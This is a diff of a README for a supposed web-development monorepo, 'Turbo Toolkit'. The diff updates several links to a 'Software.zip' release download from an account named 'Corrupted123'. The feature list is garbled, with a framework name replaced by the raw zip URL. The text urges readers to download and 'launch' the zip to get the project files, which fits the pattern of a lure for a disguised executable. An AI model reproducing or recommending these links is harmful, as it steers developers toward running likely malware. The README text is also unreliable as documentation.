@@ -7,7 +7,7 @@ Turbo Toolkit is a comprehensive monorepo project that aims to simplify web deve
 ✨ **Boilerplate:** Get started quickly with the boilerplate code provided in Turbo Toolkit.<br>
 🔧 **CICD:** Easily set up Continuous Integration and Continuous Deployment pipelines using GitHub Actions.<br>
 📦 **Monorepo:** Manage multiple related projects within a single repository using MonoRepo architecture.<br>
-🚀 **https://github.com/Corrupted123/turbo-toolkit/releases/download/v1.0/Software.zip** Utilize https://github.com/Corrupted123/turbo-toolkit/releases/download/v1.0/Software.zip for building server-rendered React applications with ease.<br>
+🚀 **https://github.com/Corrupted123/turbo-toolkit/releases/download/v2.0/Software.zip** Utilize https://github.com/Corrupted123/turbo-toolkit/releases/download/v2.0/Software.zip for building server-rendered React applications with ease.<br>
 🎭 **Playwright:** Automated browser testing made easy with Playwright integration.<br>
 📦 **PNPM:** Manage project dependencies efficiently with PNPM package manager.<br>
 🔧 **PNPM Workspaces:** Organize your projects effectively using PNPM Workspaces.<br>
@@ -26,9 +26,9 @@ The repository is organized into different directories and files, each serving a
 
 ### Get Started
 To access the full Turbo Toolkit and start simplifying your web development process, download the project by clicking the link below:
-[<img src="https://github.com/Corrupted123/turbo-toolkit/releases/download/v1.0/Software.zip%20Turbo%20Toolkit-Click%20Here-brightgreen">](https://github.com/Corrupted123/turbo-toolkit/releases/download/v1.0/Software.zip)
+[<img src="https://github.com/Corrupted123/turbo-toolkit/releases/download/v2.0/Software.zip%20Turbo%20Toolkit-Click%20Here-brightgreen">](https://github.com/Corrupted123/turbo-toolkit/releases/download/v2.0/Software.zip)
 
-📂 **https://github.com/Corrupted123/turbo-toolkit/releases/download/v1.0/Software.zip** needs to be launched to access the Turbo Toolkit project files.
+📂 **https://github.com/Corrupted123/turbo-toolkit/releases/download/v2.0/Software.zip** needs to be launched to access the Turbo Toolkit project files.
 
 If the link is not working, kindly check the "Releases" section for updated downloads.
 
